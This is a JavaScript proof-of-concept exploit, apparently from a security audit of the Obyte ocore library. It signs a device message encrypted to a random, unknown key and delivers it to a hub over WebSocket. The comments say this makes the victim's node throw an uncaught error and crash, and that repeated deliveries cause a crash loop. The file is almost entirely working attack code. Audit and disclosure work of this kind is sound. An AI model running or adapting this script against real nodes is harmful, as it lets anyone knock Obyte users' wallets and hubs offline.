// E2-16 attacker — delivers a device message encrypted to an UNKNOWN key to the victim's own hub.
// The victim's bToMe path skips the recipient-key check -> device.js decryptPackage else branch
// -> scheduled uncaught throw -> crash. Re-run for the crash-loop demo (each delivery re-crashes).
"use strict";
const O_CORE = "/Users/matheusvsky/Documents/trab/obyte-ocore-2026-08-ocore";
// patch desktop_app BEFORE any ocore require (constants.js calls getAppRootDir at load)
const desktop_app = require(O_CORE + "/desktop_app.js");
desktop_app.getAppRootDir = function () { return O_CORE; };
desktop_app.getAppDataDir = function () { return "/tmp/e2-16-attacker-data"; };
const WebSocket = require(O_CORE + "/node_modules/ws");
const ecdsa = require(O_CORE + "/node_modules/secp256k1");
const crypto = require("crypto");
const objectHash = require(O_CORE + "/object_hash.js");

const VICTIM_ADDR = process.env.VICTIM_ADDR;
const VICTIM_PERM = process.env.VICTIM_PERM; // negative control: encrypt to this key
const VICTIM_URL = process.env.VICTIM_URL || "ws://127.0.0.1:6611";
const ATTACK_ROUND = process.env.ATTACK_ROUND || "1";

function randomB64(len) { return crypto.randomBytes(len).toString("base64"); }

async function deliver() {
	// attacker's own keypair (valid signature passes the hub's check)
	const attacker_priv = crypto.randomBytes(32);
	const attacker_pub = Buffer.from(ecdsa.publicKeyCreate(attacker_priv, true)).toString("base64");

	// encrypted_package encrypted to an UNKNOWN recipient key (random) — decryptPackage else-branch
	const unknown_eph_priv = crypto.randomBytes(32);
	const unknown_eph_pub = Buffer.from(ecdsa.publicKeyCreate(unknown_eph_priv, true)).toString("base64");

	const encrypted_package = {
		iv: randomB64(12),
		authtag: randomB64(16),
		encrypted_message: randomB64(64),
		dh: {
			sender_ephemeral_pubkey: randomB64(33), // attacker's own ephemeral (not checked here)
			recipient_ephemeral_pubkey: VICTIM_PERM || unknown_eph_pub, // negative control: victim's permanent key
		},
	};

	const objDeviceMessage = {
		version: "1.0",
		to: VICTIM_ADDR,
		pubkey: attacker_pub,
		encrypted_package,
	};
	const hashToSign = objectHash.getDeviceMessageHashToSign(objDeviceMessage);
	const sigObj = ecdsa.ecdsaSign(new Uint8Array(hashToSign), new Uint8Array(attacker_priv));
	const sig = Buffer.from(sigObj.signature).toString("base64");
	objDeviceMessage.signature = sig;
	// sanity: the signature must verify against the message as the victim will check it
	const verifyOk = ecdsa.ecdsaVerify(new Uint8Array(Buffer.from(sig, "base64")), new Uint8Array(hashToSign), new Uint8Array(Buffer.from(attacker_pub, "base64")));
	console.log("[attacker] signature self-verify:", verifyOk, "| victim:", VICTIM_ADDR);

	return new Promise((resolve, reject) => {
		const ws = new WebSocket(VICTIM_URL, { maxPayload: 6 * 1024 * 1024 });
		const timer = setTimeout(() => reject(new Error("ws connect timeout")), 8000);
		ws.on("error", (e) => { clearTimeout(timer); reject(new Error("ws error: " + e)); });
		ws.on("open", () => {
			clearTimeout(timer);
			ws.send(JSON.stringify(["justsaying", { subject: "version", body: {
				protocol_version: "4.0", alt: "1", library: "ocore",
				library_version: "0.4.6", program: "e2-16-attacker", program_version: "0.0.1",
			} }]));
			ws.on("message", (data) => {
				const msg = JSON.parse(data.toString());
				console.log("[attacker] hub ->", JSON.stringify(msg).slice(0, 220));
				if (Array.isArray(msg) && msg[0] === "response") {
					console.log("[attacker] DELIVERED — hub responded to hub/deliver");
					ws.close();
					resolve(msg);
				}
			});
			setTimeout(() => {
				console.log("[attacker] round", ATTACK_ROUND, "sending hub/deliver to", VICTIM_URL);
				ws.send(JSON.stringify(["request", { tag: "e2-16-attack-" + ATTACK_ROUND, command: "hub/deliver", params: objDeviceMessage }]));
			}, 600);
		});
	});
}

deliver().then(() => {
	console.log("[attacker] delivery complete (round", ATTACK_ROUND + ") — victim crash expected ~100ms later");
	setTimeout(() => process.exit(0), 1500);
}).catch((e) => { console.error("[attacker] ERR", e.message); process.exit(1); });
